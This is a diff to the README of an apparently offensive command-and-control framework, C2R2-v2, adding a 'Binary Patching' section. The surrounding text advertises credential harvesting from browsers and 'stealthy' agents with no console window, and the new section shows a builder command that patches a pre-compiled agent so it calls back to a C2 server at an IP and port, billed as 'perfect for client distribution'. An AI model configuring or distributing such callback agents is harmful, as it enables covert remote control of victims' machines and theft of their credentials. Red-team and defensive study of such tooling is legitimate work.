@@ -69,6 +69,7 @@ C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security suite 
 - ✅ **Credential Harvesting** - Multi-browser and application credential stealing
 - ✅ **Cross-Compilation** - Build Windows agents from Linux/WSL
 - ✅ **Modular Architecture** - Load capabilities on-demand via encrypted modules
+- ✅ **Binary Patching** - Configure pre-compiled agents without Rust toolchain
 - 🐳 **Docker Build System** - One-command compilation of all components
 
 ### Advanced Features
@@ -229,6 +230,34 @@ cargo build --release
 - ✅ No console window
 - ✅ No debug output
 - ✅ 100% stealthy operation
+
+#### Option 3: Binary Patching (For GitHub Releases) 🎯
+
+**NEW!** Configure pre-compiled agents without Rust toolchain:
+
+```bash
+# Download release from GitHub
+# https://github.com/G4sp4rCS/C2R2-v2/releases
+
+# Configure agent with your C2 server IP:PORT
+./builder patch-agent \
+    --input agent.exe \
+    --output my_agent.exe \
+    --server 203.0.113.45:4444
+```
+
+**Advantages:**
+- ✅ No Rust installation required
+- ✅ No MinGW or compilers needed
+- ✅ Configure agents in seconds
+- ✅ Perfect for client distribution
+- ✅ Works on any platform (Windows/Linux/ARM64)
+
+**Limitations:**
+- ⚠️ Can only change IP:PORT (max 64 characters)
+- ⚠️ Cannot change dev/prod mode
+
+See **[Builder USAGE.md](builder/USAGE.md)** for complete documentation.
 
 ### Running
 
